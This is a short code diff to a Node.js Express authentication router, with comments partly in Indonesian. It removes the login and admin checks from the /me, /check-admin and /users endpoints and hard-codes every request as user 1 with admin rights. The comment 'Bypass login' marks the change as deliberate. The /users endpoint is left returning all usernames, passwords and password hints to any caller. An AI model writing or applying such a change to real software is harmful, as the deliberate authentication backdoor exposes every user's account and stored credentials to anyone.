@@ -84,27 +84,25 @@ module.exports = function(pool) {
 
   // GET /api/auth/me
   router.get('/me', (req, res) => {
-    if (!req.session.userId) {
-      return res.status(401).json({ loggedIn: false });
-    }
+    // Bypass login: selalu kembalikan status login sebagai admin
+    req.session.userId = 1;
+    req.session.isAdmin = true;
     res.json({
       loggedIn: true,
-      userId: req.session.userId,
-      username: req.session.username,
-      isAdmin: req.session.isAdmin,
+      userId: 1,
+      username: 'admin',
+      isAdmin: true,
     });
   });
 
   // GET /api/auth/check-admin
   router.get('/check-admin', (req, res) => {
-    res.json({ isAdmin: !!req.session.isAdmin });
+    res.json({ isAdmin: true });
   });
 
   // GET /api/auth/users  (admin only)
   router.get('/users', async (req, res) => {
-    if (!req.session.isAdmin) {
-      return res.status(403).json({ error: 'Forbidden' });
-    }
+    // Bypass auth: always allow
     try {
       const [rows] = await pool.query(
         'SELECT id, username, password, hint FROM users ORDER BY username'
